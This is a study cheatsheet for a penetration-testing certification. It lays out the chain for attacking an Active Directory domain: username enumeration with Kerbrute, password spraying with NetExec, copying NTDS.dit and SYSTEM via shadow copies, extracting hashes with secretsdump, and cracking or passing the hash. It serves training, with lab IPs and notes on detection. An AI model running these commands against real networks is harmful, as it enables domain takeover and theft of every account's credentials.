# Attacking Active Directory & NTDS.dit — CPTS Cheatsheet

**Core idea:** Enumerate domain identities → validate credentials → obtain privileged domain access → access the Domain Controller → obtain `NTDS.dit` + required system key material → extract hashes → crack or use the recovered credentials.

---

## 1. AD Mental Model

```
Workgroup → local identity management
AD Domain → centralized identity/directory management
```

```
                Domain Controller
                       ↓
                Active Directory
                 /    |     \
              PC01   PC02   SERVER
```

---

## 2. Local vs Domain Authentication

```
DOMAIN\user     → domain account
user@domain.local → domain account
.\user          → local account
HOSTNAME\user   → local account on HOSTNAME
```

Domain joining does **not** remove local SAM accounts — the local SAM is always still there.

---

## 3. Credential Stores (recap)

```
SAM      = LOCAL      → local accounts
LSASS    = LIVE        → active-session credential material
CredMan  = SAVED         → saved credentials
NTDS     = DOMAIN          → Active Directory/domain database
```

---

## 4. NTDS.dit

```
C:\Windows\NTDS\NTDS.dit
```

Contains: users, groups, computer accounts, domain credential data, directory information. Password-related attributes:

```
unicodePwd
ntPwdHistory
lmPwdHistory
supplementalCredentials
```

> NTDS.dit is NOT a plaintext password file — it's the AD database, and the password data inside is protected/encrypted.

---

## 5. Username Conventions

For "Jane Jill Doe", candidates:

```
jdoe
jjdoe
janedoe
jane.doe
doe.jane
```

Common patterns:

```
firstinitiallastname
firstinitialmiddleinitiallastname
firstnamelastname
firstname.lastname
lastname.firstname
nickname
```

---

## 6. Build a Username List

```
bwilliamson / benwilliamson / ben.williamson / williamson.ben
bburgerstien / bobburgerstien / bob.burgerstien / burgerstien.bob
```

Source names from OSINT: employee lists, LinkedIn, email format, company site.

---

## 7. Username Anarchy

```bash
./username-anarchy -i names.txt
```

```
Real names → Username Anarchy → possible username formats
```

---

## 8. Kerbrute — Username Enumeration

```bash
./kerbrute_linux_amd64 userenum --dc <DC-IP> --domain <domain> names.txt
```

Example:

```bash
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```

Success:

```
[+] VALID USERNAME: user@domain.local
```

> Valid username ≠ valid password.

Talks to the KDC/DC over Kerberos (port `88/TCP` and `88/UDP`).

---

## 9. NetExec — Credential Testing

```bash
netexec smb <DC-IP> -u <username> -p <password>
```

Against a password list:

```bash
netexec smb <DC-IP> -u <username> -p <password-list>
```

Example:

```bash
netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

```
[-] → failed authentication
[+] → successful authentication
```

---

## 10. Brute Force vs Password Spray

```
Brute force / dictionary: one user × many passwords
Password spray:           many users × one/few passwords
```

Both are online attacks — generate logs, can trip lockouts/alerts.

---

## 11. Noise & Detection

```
authentication traffic
failed logins
SIEM events
account lockouts
alerts
```

Event ID `4776` — NTLM credential validation; on a domain, the DC is authoritative for domain credentials.

---

## 12. Validate Privileges

```cmd
whoami
whoami /all
net user <username>
```

Look for group membership: `Domain Users`, `Domain Admins`, other privileged groups.

---

## 13. Check Local Administrators

```cmd
net localgroup
net localgroup Administrators
```

```
net localgroup             → shows group names
net localgroup Administrators → shows membership
```

---

## 14. Why Privileged DC Access Matters

```
Privileged access → Domain Controller → NTDS.dit → domain credential material
```

DCs are high-value because they hold hashes for every domain account.

---

## 15. VSS (Volume Shadow Copy Service)

Point-in-time volume snapshot — lets you copy a locked/active file (like `NTDS.dit`) from a stable snapshot.

```
Live volume → VSS → snapshot → read NTDS.dit
```

Create (authorized lab only):

```cmd
vssadmin CREATE SHADOW /For=C:
```

Output:

```
Shadow Copy Volume Name:
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

---

## 16. Copy NTDS.dit from the Snapshot

```cmd
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
```

```
VSS snapshot → NTDS.dit → static copy
```

---

## 17. Also Grab SYSTEM

You need both:

```
NTDS.dit + SYSTEM
```

Reason: NTDS credential data is protected — the SYSTEM hive supplies the key material needed for offline extraction (same logic as SAM/SYSTEM).

---

## 18. Offline Extraction — `secretsdump`

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

```
-ntds NTDS.dit → AD database
-system SYSTEM → key material
LOCAL          → process offline, locally
```

---

## 19. NTDS Hash Format

```
username:RID:LMHASH:NTHASH:::
```

Example:

```
Administrator:500:LMHASH:NTHASH:::
```

---

## 20. Crack the NT Hash

```bash
hashcat -m 1000 <NT_HASH> /usr/share/wordlists/rockyou.txt
```

```
NTDS.dit → secretsdump → NT hash → Hashcat -m 1000 → password
```

---

## 21. When Cracking Fails: Pass-the-Hash

An uncracked NT hash isn't dead weight:

```
username + NT hash → NTLM authentication (Pass-the-Hash)
```

```bash
evil-winrm -i <target> -u Administrator -H <NT_HASH>
```

`-H` supplies the NT hash instead of a plaintext password. PtH depends on the target auth context/protocol — it's not universal.

---

## 22. NetExec NTDS Module

```bash
netexec smb <DC-IP> -u <admin-user> -p <password> -M ntdsutil
```

```
SMB auth → privileged access → NTDS extraction → hashes
```

Syntax can shift between NetExec releases — check local `--help`/module output.

---

## 23. Important Account Types in NTDS Output

```
jdoe   → human/domain user
DC01$  → computer account (trailing $)
krbtgt → special Kerberos account (not a normal user)
```

Don't treat every NTDS entry as an ordinary employee account.

---

## 24. Complete Attack Chain

```
OSINT
 ↓
Employee names
 ↓
Username convention
 ↓
Username list
 ↓
Kerbrute userenum
 ↓
Valid usernames
 ↓
NetExec credential testing
 ↓
Valid credential
 ↓
SMB / WinRM / RDP
 ↓
Privileged account
 ↓
Domain Controller
 ↓
VSS
 ↓
NTDS.dit + SYSTEM
 ↓
secretsdump
 ↓
NT hashes
 ↓
Hashcat OR Pass-the-Hash
```

---

## 25. Must-Remember Commands

```bash
# Generate usernames
./username-anarchy -i names.txt

# Enumerate AD usernames
./kerbrute_linux_amd64 userenum --dc <DC-IP> --domain <DOMAIN> names.txt

# Test credentials
netexec smb <DC-IP> -u <USER> -p <PASSWORD>
netexec smb <DC-IP> -u <USER> -p <PASSWORD_LIST>
```

```cmd
net user <username>
net localgroup Administrators
vssadmin CREATE SHADOW /For=C:
```

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
hashcat -m 1000 <NT_HASH> /usr/share/wordlists/rockyou.txt
evil-winrm -i <target> -u <username> -H <NT_HASH>
netexec smb <DC-IP> -u <user> -p <password> -M ntdsutil
```

---

## 26. Memory Block

```
ACTIVE DIRECTORY

SAM       → local
NTDS.dit  → domain

Username conventions:
  firstinitiallastname / firstnamelastname
  firstname.lastname / lastname.firstname

Username Anarchy → generate candidates
Kerbrute userenum → validate likely usernames
NetExec           → test credentials / enumerate services

4776 → NTLM credential validation event
VSS  → point-in-time volume snapshot

NTDS.dit + SYSTEM → offline extraction material
secretsdump       → extract domain credential material

NT hash → Hashcat -m 1000, or Pass-the-Hash in applicable NTLM contexts

krbtgt → special Kerberos account
$      → trailing $ = computer account
```

---

## 27. The Four Things to Burn Into Memory

```
1. SAM        → local
2. NTDS.dit   → domain
3. Kerbrute   → "Does this likely username exist?"
4. secretsdump → "Extract credential material from NTDS + SYSTEM."
```

Full practical chain:

```
Names → usernames → Kerbrute → valid users → NetExec → valid credentials
→ privilege check → DC access → VSS/NTDS → secretsdump → NT hashes → Hashcat OR PtH
```

---

## 28. The Deeper CPTS Lesson

This is the module where the attack should really start reading as a **chain**, not a pile of commands:

```
OSINT → Enumeration → Authentication → Authorization
→ Credential extraction → Credential cracking/reuse → Lateral movement
```

And one distinction worth keeping straight:

```
NTDS.dit ≠ "just a file containing passwords."
It's the AD database. The password-related attributes inside it are protected,
and extraction requires the right privileges plus additional system key material (SYSTEM hive).
```

Domain Controllers hold the credential hashes for every domain account — that's exactly why compromising the DC is such a significant event.

---

## 29. One-Line Mental Model

> Build a username list from OSINT, validate it with Kerbrute, spray/test it with NetExec, escalate to a DC, pull NTDS.dit + SYSTEM via VSS, extract offline with secretsdump, and either crack the NT hashes or use them directly with Pass-the-Hash.
